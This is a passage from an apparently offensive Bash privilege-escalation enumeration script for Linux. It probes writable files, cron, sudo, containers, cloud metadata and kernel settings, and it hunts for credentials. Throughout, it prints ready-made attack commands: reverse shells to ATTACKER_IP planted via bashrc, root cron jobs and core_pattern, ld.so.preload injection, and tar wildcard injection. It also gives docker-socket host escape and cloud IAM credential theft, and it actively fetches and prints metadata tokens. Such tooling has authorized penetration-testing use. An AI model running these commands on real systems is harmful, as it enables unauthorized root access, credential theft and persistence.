    "/etc/aliases"
    "/etc/pam.d"
    "/etc/security"
)

for config_file in "${CONFIG_FILES[@]}"; do
    if [ -w "$config_file" ] 2>/dev/null; then
        critical "Writable configuration file: $config_file"
        WRITABLE_COUNT=$((WRITABLE_COUNT + 1))
        if [ -f "$config_file" ]; then
            show_exploit "Writable Config File" \
                "Modify configuration file to execute commands or load malicious libraries." \
                "# For ld.so.preload:\necho '/tmp/evil.so' > $config_file\n# For profile/bashrc:\necho 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> $config_file"
        elif [ -d "$config_file" ]; then
            show_exploit "Writable Config Directory" \
                "Create malicious configuration files in this directory." \
                "echo 'malicious config' > $config_file/exploit"
        fi
    fi
done

# Check for writable /var/spool/cron
if [ -w /var/spool/cron ] 2>/dev/null; then
    critical "Writable /var/spool/cron directory!"
    WRITABLE_COUNT=$((WRITABLE_COUNT + 1))
    show_exploit "Writable /var/spool/cron" \
        "Create cron job file for root user." \
        "echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"' > /var/spool/cron/root"
fi

# Check for writable /var/spool/cron/crontabs
if [ -w /var/spool/cron/crontabs ] 2>/dev/null; then
    critical "Writable /var/spool/cron/crontabs directory!"
    WRITABLE_COUNT=$((WRITABLE_COUNT + 1))
fi

################################################################################
# 26. SUDO ENV_KEEP EXPLOITATION
################################################################################
progress "Sudo Environment"
section "26. SUDO ENVIRONMENT VARIABLES"

if command -v sudo >/dev/null 2>&1; then
    SUDO_OUTPUT=$(sudo -l 2>/dev/null)
    if echo "$SUDO_OUTPUT" | grep -qi "env_keep"; then
        warning "Sudo env_keep found - potential environment variable exploitation!"
        echo "$SUDO_OUTPUT" | grep -i "env_keep" | tee -a "$OUTPUT_FILE"
        show_exploit "Sudo env_keep Exploitation" \
            "If env_keep contains PATH, LD_PRELOAD, or other dangerous variables, can be exploited." \
            "# Check what's kept:\nsudo -l\n# If PATH is kept:\nexport PATH=/tmp:$PATH\n# Create malicious binary in /tmp\nsudo <command>"
    fi
fi

################################################################################
# 27. WILDCARD INJECTION
################################################################################
progress "Wildcard Injection"
section "27. WILDCARD INJECTION VULNERABILITIES"

info "Checking for wildcard usage in cron jobs and scripts..."

# Check cron jobs for wildcards
if [ -r /etc/crontab ]; then
    CRON_WILDCARD=$(grep -E "\*.*\.(sh|py|pl|rb)" /etc/crontab 2>/dev/null || echo "")
    if [ -n "$CRON_WILDCARD" ]; then
        warning "Wildcard found in cron job - potential injection!"
        echo "$CRON_WILDCARD" | tee -a "$OUTPUT_FILE"
        show_exploit "Wildcard Injection in Cron" \
            "If cron uses wildcards with tar/cpio/etc, can inject commands via filenames." \
            "# Create malicious filename:\ntouch '/tmp/--checkpoint=1'\ntouch '/tmp/--checkpoint-action=exec=sh shell.sh'\n# Or for find:\ntouch '/tmp/-exec'\ntouch '/tmp/; sh #'"
    fi
fi

# Check user crontab for wildcards
USER_CRON=$(crontab -l 2>/dev/null || echo "")
if echo "$USER_CRON" | grep -qE "\*.*tar|\*.*cpio|\*.*find"; then
    warning "Wildcard with dangerous command in user crontab!"
    echo "$USER_CRON" | grep -E "\*.*tar|\*.*cpio|\*.*find" | tee -a "$OUTPUT_FILE"
    show_exploit "Wildcard Injection" \
        "Create files with malicious names that will be interpreted as command options." \
        "touch '--checkpoint=1' '--checkpoint-action=exec=sh shell.sh'"
fi

################################################################################
# 28. Writable /usr/local and /opt
################################################################################
progress "Writable System Directories"
section "28. WRITABLE SYSTEM DIRECTORIES"

info "Checking for writable system directories..."

SYSTEM_DIRS=("/usr/local/bin" "/usr/local/sbin" "/opt" "/var/www" "/var/www/html")

for sys_dir in "${SYSTEM_DIRS[@]}"; do
    if [ -d "$sys_dir" ] && [ -w "$sys_dir" ] 2>/dev/null; then
        critical "Writable system directory: $sys_dir"
        WRITABLE_COUNT=$((WRITABLE_COUNT + 1))
        ls -lad "$sys_dir" 2>/dev/null | tee -a "$OUTPUT_FILE"
        if echo "$PATH" | grep -q "$sys_dir"; then
            show_exploit "Writable PATH Directory" \
                "Create malicious binary in this directory that's in PATH." \
                "echo -e '#!/bin/bash\n/bin/bash' > $sys_dir/ls\nchmod +x $sys_dir/ls"
        else
            show_exploit "Writable System Directory" \
                "Place malicious scripts or binaries here that may be executed by services." \
                "echo -e '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > $sys_dir/exploit.sh\nchmod +x $sys_dir/exploit.sh"
        fi
    fi
done

################################################################################
# 29. ADDITIONAL KERNEL EXPLOITS
################################################################################
progress "Additional Kernel Checks"
section "29. ADDITIONAL KERNEL VULNERABILITIES"

KERNEL_VERSION=$(uname -r)
KERNEL_MAJOR=$(echo "$KERNEL_VERSION" | cut -d. -f1)
KERNEL_MINOR=$(echo "$KERNEL_VERSION" | cut -d. -f2)
KERNEL_PATCH=$(echo "$KERNEL_VERSION" | cut -d. -f3 | cut -d- -f1 | sed 's/[^0-9].*//')

# Check for more kernel CVEs
if [ "$KERNEL_MAJOR" -eq 4 ] && [ "$KERNEL_MINOR" -lt 14 ]; then
    warning "Kernel < 4.14 - check for multiple CVEs"
    KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT + 1))
fi

# CVE-2017-16995 (eBPF) - Linux 4.4-4.14
if [ "$KERNEL_MAJOR" -eq 4 ]; then
    if [ "$KERNEL_MINOR" -ge 4 ] && [ "$KERNEL_MINOR" -le 14 ]; then
        warning "Potential CVE-2017-16995 (eBPF) vulnerability"
        KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT + 1))
        show_exploit "CVE-2017-16995 (eBPF)" \
            "eBPF verifier vulnerability. Exploit available." \
            "Check: https://www.exploit-db.com/exploits/45010"
    fi
fi

# CVE-2017-1000112 (KASLR) - Linux < 4.13
if [ "$KERNEL_MAJOR" -lt 4 ] || ([ "$KERNEL_MAJOR" -eq 4 ] && [ "$KERNEL_MINOR" -lt 13 ]); then
    warning "Potential CVE-2017-1000112 (KASLR bypass) vulnerability"
    KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT + 1))
fi

################################################################################
# 30. PASSWORD AND CREDENTIAL SEARCH
################################################################################
if [ "$SKIP_CREDS" -eq 0 ]; then
progress "Password & Credential Search"
section "30. PASSWORD AND CREDENTIAL SEARCH"

info "Searching for potential passwords and credentials in files..."

PASSWORD_PATTERNS=(
    "password"
    "passwd"
    "pwd"
    "secret"
    "key"
    "token"
    "api_key"
    "apikey"
    "apisecret"
    "access_token"
    "accesskey"
    "private_key"
    "privatekey"
    "secretkey"
    "auth"
    "credential"
    "mysql"
    "postgres"
    "database"
    "db_password"
    "dbpass"
    "dbuser"
    "admin"
    "root"
)

# Common file extensions and locations to search
SEARCH_LOCATIONS=(
    "$HOME"
    "/tmp"
    "/var/tmp"
    "/opt"
    "/usr/local"
    "/etc"
)

PASSWORD_FOUND=0
PASSWORD_FILES=()

# Function to search for passwords in files
search_passwords() {
    local search_dir="$1"
    local max_depth=3
    
    if [ ! -d "$search_dir" ] || [ ! -r "$search_dir" ]; then
        return
    fi
    
    # Search in common file types
    find "$search_dir" -maxdepth "$max_depth" -type f \( \
        -name "*.conf" -o \
        -name "*.config" -o \
        -name "*.cfg" -o \
        -name "*.ini" -o \
        -name "*.env" -o \
        -name ".env" -o \
        -name "*.sh" -o \
        -name "*.py" -o \
        -name "*.pl" -o \
        -name "*.rb" -o \
        -name "*.php" -o \
        -name "*.js" -o \
        -name "*.json" -o \
        -name "*.xml" -o \
        -name "*.yml" -o \
        -name "*.yaml" -o \
        -name "*.properties" -o \
        -name "*.sql" -o \
        -name "*.log" -o \
        -name "*.bak" -o \
        -name "*.backup" -o \
        -name "*.old" -o \
        -name "*password*" -o \
        -name "*secret*" -o \
        -name "*credential*" \
    \) 2>/dev/null | while read -r file; do
        if [ -r "$file" ] && [ -s "$file" ]; then
            # Skip binary files
            if file "$file" 2>/dev/null | grep -qiE "(text|ascii|script)"; then
                # Search for password patterns
                for pattern in "${PASSWORD_PATTERNS[@]}"; do
                    if grep -qiE "(^|[^a-zA-Z0-9_])${pattern}([^a-zA-Z0-9_]|$)" "$file" 2>/dev/null; then
                        PASSWORD_FILES+=("$file")
                        warning "Potential password/credential found in: $file"
                        log "  File: $file"
                        
                        # Extract lines with potential passwords (max 5 lines per file)
                        grep -iE "(^|[^a-zA-Z0-9_])${pattern}([^a-zA-Z0-9_]|$)" "$file" 2>/dev/null | head -5 | while read -r line; do
                            # Mask potential passwords (show first 2 and last 2 chars)
                            MASKED_LINE=$(echo "$line" | sed -E 's/([^=:[:space:]]{1,2})[^=:[:space:]]{4,}([^=:[:space:]]{1,2})/\1****\2/g' 2>/dev/null || echo "$line")
                            log "    $MASKED_LINE"
                        done
                        
                        # Check for common password formats
                        if grep -qiE "(password|passwd|pwd)[[:space:]]*[=:][[:space:]]*[^[:space:]]{4,}" "$file" 2>/dev/null; then
                            critical "Password pattern detected in: $file"
                            show_exploit "Password in Config File" \
                                "Extract password from configuration file." \
                                "grep -i password $file\n# Or:\ncat $file | grep -i password"
                        fi
                        break
                    fi
                done
            fi
        fi
    done
}

# Search in common locations
for location in "${SEARCH_LOCATIONS[@]}"; do
    if [ -d "$location" ] && [ -r "$location" ]; then
        search_passwords "$location"
    fi
done

# Search for .env files specifically
info "Searching for .env files..."
find / -maxdepth 5 -name ".env" -type f 2>/dev/null | head -20 | while read -r env_file; do
    if [ -r "$env_file" ]; then
        warning ".env file found: $env_file"
        log "  File: $env_file"
        # Show first few lines (masked)
        head -10 "$env_file" 2>/dev/null | while read -r line; do
            MASKED=$(echo "$line" | sed -E 's/([^=]{1,2})[^=]{4,}([^=]{1,2})/\1****\2/g' 2>/dev/null || echo "$line")
            log "    $MASKED"
        done
        show_exploit ".env File" \
            "Environment files often contain credentials." \
            "cat $env_file"
    fi
done

# Search for files with "password" in filename
info "Searching for files with 'password' in name..."
find / -maxdepth 4 -iname "*password*" -type f 2>/dev/null | head -20 | while read -r pass_file; do
    if [ -r "$pass_file" ] && [ -s "$pass_file" ]; then
        warning "File with 'password' in name: $pass_file"
        log "  File: $pass_file"
        ls -la "$pass_file" 2>/dev/null | tee -a "$OUTPUT_FILE"
    fi
done

# Search for base64 encoded strings (potential passwords)
info "Searching for base64 encoded strings (potential passwords)..."
find "$HOME" /tmp /var/tmp -maxdepth 2 -type f -size -100k 2>/dev/null | head -50 | while read -r file; do
    if [ -r "$file" ] && file "$file" 2>/dev/null | grep -qi "text"; then
        # Look for base64-like strings (long strings of base64 chars)
        BASE64_MATCH=$(grep -oE '[A-Za-z0-9+/]{20,}={0,2}' "$file" 2>/dev/null | head -3)
        if [ -n "$BASE64_MATCH" ]; then
            warning "Potential base64 encoded string in: $file"
            log "  File: $file"
            echo "$BASE64_MATCH" | while read -r b64; do
                log "    $b64"
            done
        fi
    fi
done

# Search for hex encoded strings
info "Searching for hex encoded strings..."
find "$HOME" /tmp /var/tmp -maxdepth 2 -type f -size -100k 2>/dev/null | head -50 | while read -r file; do
    if [ -r "$file" ] && file "$file" 2>/dev/null | grep -qi "text"; then
        # Look for hex-like strings
        HEX_MATCH=$(grep -oE '[0-9a-fA-F]{32,}' "$file" 2>/dev/null | head -3)
        if [ -n "$HEX_MATCH" ]; then
            warning "Potential hex encoded string in: $file"
            log "  File: $file"
            echo "$HEX_MATCH" | while read -r hex; do
                log "    $hex"
            done
        fi
    fi
done

# Search in common config files
info "Checking common configuration files for credentials..."

CONFIG_FILES=(
    "/etc/mysql/my.cnf"
    "/etc/postgresql/postgresql.conf"
    "/etc/apache2/apache2.conf"
    "/etc/nginx/nginx.conf"
    "/etc/ssh/sshd_config"
    "/etc/vsftpd/vsftpd.conf"
    "/etc/samba/smb.conf"
    "/root/.bash_history"
    "/root/.mysql_history"
    "/root/.psql_history"
)

for config_file in "${CONFIG_FILES[@]}"; do
    if [ -r "$config_file" ] && [ -f "$config_file" ]; then
        if grep -qiE "(password|passwd|pwd|secret|key)" "$config_file" 2>/dev/null; then
            warning "Potential credentials in: $config_file"
            log "  File: $config_file"
            grep -iE "(password|passwd|pwd|secret|key)" "$config_file" 2>/dev/null | head -5 | while read -r line; do
                MASKED=$(echo "$line" | sed -E 's/([^=:[:space:]]{1,2})[^=:[:space:]]{4,}([^=:[:space:]]{1,2})/\1****\2/g' 2>/dev/null || echo "$line")
                log "    $MASKED"
            done
        fi
    fi
done

# Search in web application configs
info "Searching for web application configuration files..."
WEB_CONFIGS=(
    "/var/www"
    "/opt"
    "/usr/local/www"
    "/home/*/public_html"
    "/home/*/www"
)

for web_dir in "${WEB_CONFIGS[@]}"; do
    if [ -d "$web_dir" ] 2>/dev/null; then
        find "$web_dir" -maxdepth 3 -type f \( \
            -name "config.php" -o \
            -name "config.inc.php" -o \
            -name "database.php" -o \
            -name "settings.php" -o \
            -name "wp-config.php" -o \
            -name "config.json" -o \
            -name "application.properties" \
        \) 2>/dev/null | head -20 | while read -r web_config; do
            if [ -r "$web_config" ]; then
                if grep -qiE "(password|passwd|db_password|dbpass)" "$web_config" 2>/dev/null; then
                    warning "Potential database credentials in: $web_config"
                    log "  File: $web_config"
                    grep -iE "(password|passwd|db_password|dbpass|dbuser)" "$web_config" 2>/dev/null | head -5 | while read -r line; do
                        MASKED=$(echo "$line" | sed -E 's/([^=:[:space:]]{1,2})[^=:[:space:]]{4,}([^=:[:space:]]{1,2})/\1****\2/g' 2>/dev/null || echo "$line")
                        log "    $MASKED"
                    done
                    show_exploit "Web Config Credentials" \
                        "Extract database credentials from web application config." \
                        "grep -i password $web_config\n# Or view full file:\ncat $web_config"
                fi
            fi
        done
    fi
done

log ""
if [ ${#PASSWORD_FILES[@]} -eq 0 ]; then
    info "No obvious password patterns found in common locations"
else
    warning "Password patterns found in ${#PASSWORD_FILES[@]} file(s)! Review the files above carefully."
fi

else
    info "Credential search skipped (--skip-creds)"
fi

################################################################################
# 32. PACKAGE-TO-CVE CORRELATOR (UNIQUE)
################################################################################
progress "Package CVE Correlator"
section "32. PACKAGE-TO-CVE CORRELATOR"
scan_installed_packages

################################################################################
# 33. CLOUD METADATA ESCAPE (UNIQUE — AWS/GCP/Azure/DO)
################################################################################
if [ "$SKIP_NETWORK" -eq 0 ]; then
progress "Cloud Metadata Escape"
section "33. CLOUD METADATA & IAM ESCAPE"

info "Probing cloud instance metadata endpoints..."

# AWS IMDSv1/v2
AWS_TOKEN=""
if curl -s -m 2 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null | grep -q .; then
    AWS_TOKEN=$(curl -s -m 2 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
    finding_critical "AWS IMDSv2 Accessible" "EC2 metadata token obtained — IAM role credentials extractable" \
        "T1552.005" "curl -H \"X-aws-ec2-metadata-token: \$TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/" "cloud_aws"
    IAM_ROLE=$(curl -s -m 2 -H "X-aws-ec2-metadata-token: $AWS_TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null | head -1)
    if [ -n "$IAM_ROLE" ]; then
        critical "AWS IAM Role found: $IAM_ROLE"
        CREDS=$(curl -s -m 2 -H "X-aws-ec2-metadata-token: $AWS_TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE" 2>/dev/null)
        echo "$CREDS" | tee -a "$OUTPUT_FILE"
        add_attack_chain "CLOUD→ROOT: Extract IAM creds from IMDS → AssumeRole/SSM → EC2 instance connect → root"
        show_exploit "AWS IAM Credential Theft" \
            "Steal temporary AWS credentials from instance metadata." \
            "TOKEN=\$(curl -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')\nROLE=\$(curl -H \"X-aws-ec2-metadata-token: \$TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/)\ncurl -H \"X-aws-ec2-metadata-token: \$TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/\$ROLE"
    fi
elif curl -s -m 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null | grep -q .; then
    finding_critical "AWS IMDSv1 Accessible" "Unprotected EC2 metadata — SSRF or direct access" \
        "T1552.005" "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/" "cloud_aws"
fi

# GCP
GCP_META=$(curl -s -m 2 -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null)
if echo "$GCP_META" | grep -q "access_token"; then
    finding_critical "GCP Metadata Accessible" "GCP service account token extractable" \
        "T1552.005" "curl -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" "cloud_gcp"
    add_attack_chain "CLOUD→ROOT: GCP SA token → gcloud compute ssh → privileged SA → root"
fi

# Azure
AZ_META=$(curl -s -m 2 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null)
if echo "$AZ_META" | grep -q "compute"; then
    finding_critical "Azure IMDS Accessible" "Azure instance metadata exposed" \
        "T1552.005" "curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'" "cloud_azure"
    add_attack_chain "CLOUD→ROOT: Azure managed identity token → ARM API → VM run command"
fi

# DigitalOcean
DO_META=$(curl -s -m 2 http://169.254.169.254/metadata/v1.json 2>/dev/null)
if echo "$DO_META" | grep -q "droplet_id"; then
    finding_warning "DigitalOcean Metadata" "DO droplet metadata accessible" "T1552.005" "curl http://169.254.169.254/metadata/v1.json" "cloud_do"
fi

# Check for cloud CLI tools with cached credentials
for cred_path in ~/.aws/credentials ~/.config/gcloud ~/.azure ~/.digitalocean; do
    if [ -r "$cred_path" ] 2>/dev/null || [ -d "$cred_path" ] 2>/dev/null; then
        finding_warning "Cloud Credentials on Disk" "Found: $cred_path" "T1552.001" "cat $cred_path" "cloud_creds"
    fi
done
fi

################################################################################
# 34. CONTAINER TRINITY — Docker/Podman/K8s/containerd (UNIQUE)
################################################################################
progress "Container Trinity Escape"
section "34. CONTAINER TRINITY ESCAPE ANALYSIS"

# Docker socket
for sock in /var/run/docker.sock /run/docker.sock; do
    if [ -S "$sock" ] && [ -w "$sock" ]; then
        finding_critical "Docker Socket Writable" "$sock — instant root via container" \
            "T1611" "docker -H unix://$sock run -v /:/mnt --rm -it alpine chroot /mnt sh" "docker_socket"
        add_attack_chain "CONTAINER→ROOT: Writable docker.sock → mount host / → chroot → root shell"
    elif [ -S "$sock" ] && [ -r "$sock" ]; then
        if groups | grep -q docker; then
            finding_critical "Docker Group Member" "User in docker group = root equivalent" \
                "T1611" "docker run -v /:/mnt -it alpine chroot /mnt bash" "docker_group"
            add_attack_chain "CONTAINER→ROOT: docker group → volume mount host FS → chroot"
        fi
    fi
done

# Podman rootless escape vectors
if command -v podman >/dev/null 2>&1; then
    info "Podman detected — checking rootless escape vectors..."
    if [ -w /run/user/$(id -u)/podman/podman.sock ] 2>/dev/null; then
        finding_warning "Podman User Socket Writable" "Rootless podman socket accessible" "T1611" "podman run --privileged" "podman"
    fi
    podman unshare id 2>/dev/null | grep -q "uid=0" && \
        finding_critical "Podman Unshare UID 0" "podman unshare grants namespace root" "T1611" "podman unshare chroot / bash" "podman_unshare"
fi

# containerd/CRI
for sock in /run/containerd/containerd.sock /var/run/containerd/containerd.sock; do
    if [ -S "$sock" ] && [ -w "$sock" ]; then
        finding_critical "containerd Socket Writable" "$sock" "T1611" "ctr -n k8s.io containers list" "containerd"
    fi
done

# Kubernetes service account tokens
K8S_TOKEN_PATHS=(
    /var/run/secrets/kubernetes.io/serviceaccount/token
    /run/secrets/kubernetes.io/serviceaccount/token
)
for k8s_tok in "${K8S_TOKEN_PATHS[@]}"; do
    if [ -r "$k8s_tok" ]; then
        finding_critical "K8s Service Account Token" "Pod SA token at $k8s_tok" \
            "T1611" "TOKEN=\$(cat $k8s_tok); curl -k -H \"Authorization: Bearer \$TOKEN\" https://kubernetes.default.svc/api/v1/namespaces/default/pods" "k8s_sa"
        add_attack_chain "K8S→CLUSTER: SA token → RBAC enum → privileged pod/create → node escape"
        # Try to reach K8s API
        if command -v curl >/dev/null 2>&1; then
            K8S_API=$(curl -sk -m 3 -H "Authorization: Bearer $(cat "$k8s_tok")" https://kubernetes.default.svc/api/v1/namespaces/default/pods 2>/dev/null)
            if echo "$K8S_API" | grep -q '"kind"'; then
                success "K8s API reachable from pod — enumerate RBAC with kubectl or curl"
                echo "$K8S_API" | head -20 | tee -a "$OUTPUT_FILE"
            fi
        fi
    fi
done

# Check for privileged container indicators
if [ -r /proc/1/status ]; then
    CAP_EFF=$(grep CapEff /proc/1/status 2>/dev/null | awk '{print $2}')
    if [ -n "$CAP_EFF" ] && [ "$CAP_EFF" != "0000000000000000" ]; then
        CAP_DEC=$(printf "%d" "0x$CAP_EFF" 2>/dev/null)
        if [ -n "$CAP_DEC" ] && [ "$CAP_DEC" -gt 1000000 ] 2>/dev/null; then
            finding_warning "Privileged Container Indicators" "PID 1 has elevated capabilities: $CAP_EFF" "T1611" "capsh --decode=$CAP_EFF" "k8s_priv"
        fi
    fi
    # Host PID namespace
    if [ "$(stat -c %i /proc/1/root 2>/dev/null)" = "$(stat -c %i / 2>/dev/null)" ] 2>/dev/null; then
        info "Container shares host PID namespace or is bare metal"
    else
        finding_info "Container Detected" "Isolated PID namespace — container escape vectors apply" "T1611" "" "container"
    fi
fi

# runc/docker CVE check
if command -v runc >/dev/null 2>&1; then
    RUNC_VER=$(runc --version 2>/dev/null | head -1)
    info "runc version: $RUNC_VER"
    if echo "$RUNC_VER" | grep -qE '1\.0\.0-rc[0-9]|1\.0\.0-rc1[01]'; then
        finding_critical "CVE-2019-5736" "Vulnerable runc — container escape via /proc/self/exe" "T1611" "Overwrite runc binary via malicious container" "runc_cve"
    fi
fi

################################################################################
# 35. D-BUS & UNIX SOCKET AUDIT (UNIQUE)
################################################################################
progress "D-Bus & Unix Socket Audit"
section "35. D-BUS & UNIX SOCKET PRIVILEGE AUDIT"

info "Enumerating world-writable and user-accessible Unix domain sockets..."
find /tmp /var/run /run -type s 2>/dev/null | head -30 | while read -r usock; do
    if [ -w "$usock" ] 2>/dev/null; then
        finding_warning "Writable Unix Socket" "$usock" "T1543" "Investigate socket protocol for injection" "unix_sock"
    fi
done

# D-Bus system bus
if command -v dbus-send >/dev/null 2>&1; then
    info "D-Bus system bus enumeration..."
    dbus-send --system --dest=org.freedesktop.DBus --type=method_call --print-reply \
        /org/freedesktop/DBus org.freedesktop.DBus.ListNames 2>/dev/null | head -30 | tee -a "$OUTPUT_FILE"

    # Polkit over D-Bus
    if dbus-send --system --dest=org.freedesktop.PolicyKit1 --print-reply \
        /org/freedesktop/PolicyKit1/Authority org.freedesktop.DBus.Introspectable.Introspect 2>/dev/null | grep -q .; then
        info "Polkit D-Bus interface accessible"
    fi

    # systemd-logind — user session hijack
    if dbus-send --system --dest=org.freedesktop.login1 --print-reply \
        /org/freedesktop/login1 org.freedesktop.DBus.Introspectable.Introspect 2>/dev/null | grep -q .; then
        finding_warning "systemd-logind D-Bus" "Potential session manipulation via logind" \
            "T1543" "busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CreateSession ..." "dbus_logind"
    fi
fi

# Abstract namespace sockets (container/k8s escape)
if [ -r /proc/net/unix ]; then
    ABS_SOCK=$(grep '@' /proc/net/unix 2>/dev/null | head -15)
    if [ -n "$ABS_SOCK" ]; then
        info "Abstract namespace sockets (potential container escape):"
        echo "$ABS_SOCK" | tee -a "$OUTPUT_FILE"
    fi
fi

################################################################################
# 36. APPARMOR / SELINUX / MAC BYPASS (UNIQUE)
################################################################################
progress "MAC Security Profile"
section "36. MANDATORY ACCESS CONTROL ANALYSIS"

if command -v aa-status >/dev/null 2>&1; then
    AA_STATUS=$(aa-status 2>/dev/null)
    echo "$AA_STATUS" | tee -a "$OUTPUT_FILE"
    if echo "$AA_STATUS" | grep -qi "apparmor.*disabled\|0 profiles"; then
        finding_warning "AppArmor Disabled/Empty" "MAC not enforcing — easier privesc" "T1562.001" "aa-status" "apparmor"
    else
        COMPLAIN=$(echo "$AA_STATUS" | grep -c "complain" 2>/dev/null || echo 0)
        [ "$COMPLAIN" -gt 0 ] && finding_warning "AppArmor Complain Mode" "$COMPLAIN profiles in complain mode" "T1562.001" "aa-complain <profile>" "apparmor"
    fi
elif [ -d /sys/kernel/security/apparmor ]; then
    info "AppArmor kernel support present"
fi

if command -v getenforce >/dev/null 2>&1; then
    SELINUX=$(getenforce 2>/dev/null)
    info "SELinux status: $SELINUX"
    if [ "$SELINUX" = "Disabled" ] || [ "$SELINUX" = "Permissive" ]; then
        finding_warning "SELinux $SELINUX" "SELinux not enforcing" "T1562.001" "getenforce" "selinux"
    fi
    if command -v semanage >/dev/null 2>&1; then
        semanage boolean -l 2>/dev/null | grep -i "allow.*exec" | head -10 | tee -a "$OUTPUT_FILE"
    fi
fi

# Seccomp
if [ -r /proc/1/status ]; then
    SECCOMP=$(grep Seccomp /proc/1/status 2>/dev/null | awk '{print $2}')
    case "$SECCOMP" in
        0) info "Seccomp: disabled (full syscall access)" ;;
        1) info "Seccomp: strict mode" ;;
        2) info "Seccomp: filter mode (check for bypass via allowed syscalls)" ;;
    esac
fi

################################################################################
# 37. ACL & EXTENDED PERMISSION AUDIT (UNIQUE)
################################################################################
progress "ACL Extended Permissions"
section "37. ACL & EXTENDED PERMISSION AUDIT"

if command -v getfacl >/dev/null 2>&1; then
    ACL_TARGETS=("/etc/passwd" "/etc/shadow" "/etc/sudoers" "/root" "/etc/crontab" "/var/spool/cron")
    for acl_target in "${ACL_TARGETS[@]}"; do
        if [ -e "$acl_target" ]; then
            ACL_OUT=$(getfacl -p "$acl_target" 2>/dev/null)
            if echo "$ACL_OUT" | grep -qE "^user:$(whoami):|^group:$(whoami):"; then
                finding_critical "ACL Grants Access" "$(whoami) has ACL on $acl_target" \
                    "T1222.001" "getfacl $acl_target" "acl"
                echo "$ACL_OUT" | tee -a "$OUTPUT_FILE"
                add_attack_chain "ACL→ROOT: ACL write on $acl_target → modify credentials → root"
            fi
        fi
    done
fi

################################################################################
# 38. PTRACE / CORE DUMP / HARDENING (UNIQUE)
################################################################################
progress "Kernel Hardening Analysis"
section "38. KERNEL HARDENING & PTRACE ANALYSIS"

info "Kernel hardening parameters:"
HARDEN_PARAMS=(
    "kernel.yama.ptrace_scope"
    "kernel.kptr_restrict"
    "kernel.dmesg_restrict"
    "kernel.unprivileged_userns_clone"
    "kernel.unprivileged_bpf_disabled"
    "fs.protected_symlinks"
    "fs.protected_hardlinks"
    "fs.suid_dumpable"
)
for param in "${HARDEN_PARAMS[@]}"; do
    VAL=$(sysctl -n "$param" 2>/dev/null)
    if [ -n "$VAL" ]; then
        log "  $param = $VAL"
        case "$param" in
            kernel.yama.ptrace_scope)
                [ "$VAL" = "0" ] && finding_warning "Ptrace Unrestricted" "ptrace_scope=0 — process injection possible" "T1055.008" "gdb -p <root_pid>" "ptrace"
                ;;
            kernel.unprivileged_userns_clone)
                [ "$VAL" = "1" ] && finding_warning "User Namespaces Enabled" "unprivileged user namespaces — id mapping abuse" "T1068" "unshare -Ur" "userns"
                ;;
            kernel.unprivileged_bpf_disabled)
                [ "$VAL" = "0" ] || [ "$VAL" = "2" ] && finding_warning "Unprivileged BPF" "BPF available to unprivileged users" "T1068" "CVE-2022-23222 BPF LPE" "bpf"
                ;;
            fs.suid_dumpable)
                [ "$VAL" != "0" ] && finding_warning "SUID Core Dumps Enabled" "suid_dumpable=$VAL" "T1003" "Modify core_pattern for code exec" "coredump"
                ;;
        esac
    fi
done

# Writable core_pattern = instant root
if [ -w /proc/sys/kernel/core_pattern ] 2>/dev/null; then
    finding_critical "Writable core_pattern" "/proc/sys/kernel/core_pattern writable — root code execution" \
        "T1068" "echo '|/bin/bash -c \"bash -i >& /dev/tcp/IP/4444 0>&1\"' > /proc/sys/kernel/core_pattern" "core_pattern"
    add_attack_chain "CORE→ROOT: Write core_pattern pipe → trigger SUID crash → root shell"
fi

################################################################################
# 39. PERSISTENCE VECTOR PREDICTOR (UNIQUE)
################################################################################
progress "Persistence Vector Predictor"
section "39. PERSISTENCE VECTOR PREDICTOR"

PERSIST_SCORE=0
PERSIST_VECTORS=()

check_persist() {
    local score="$1" vector="$2" detail="$3"
    PERSIST_SCORE=$((PERSIST_SCORE + score))
    PERSIST_VECTORS+=("[$score pts] $vector: $detail")
}

[ -w /etc/crontab ] 2>/dev/null && check_persist 10 "crontab" "/etc/crontab writable"
[ -w /etc/systemd/system ] 2>/dev/null && check_persist 9 "systemd" "/etc/systemd/system writable"
[ -w /etc/rc.local ] 2>/dev/null && check_persist 8 "rc.local" "/etc/rc.local writable"
[ -w /etc/profile ] 2>/dev/null && check_persist 7 "profile" "/etc/profile writable"
[ -w /etc/ld.so.preload ] 2>/dev/null && check_persist 10 "ldpreload" "/etc/ld.so.preload writable"
systemctl is-enabled user@$(id -u).service 2>/dev/null | grep -q enabled && check_persist 6 "user-linger" "systemd user linger enabled"
[ -w ~/.bashrc ] 2>/dev/null && check_persist 3 "bashrc" "~/.bashrc writable"
[ -d /etc/update-motd.d ] && [ -w /etc/update-motd.d ] 2>/dev/null && check_persist 5 "motd" "update-motd.d writable"
[ -w /etc/pam.d ] 2>/dev/null && check_persist 9 "pam" "/etc/pam.d writable"

info "Persistence score: $PERSIST_SCORE / 100"
for pv in "${PERSIST_VECTORS[@]}"; do
    warning "$pv"
    log "  $pv"
done
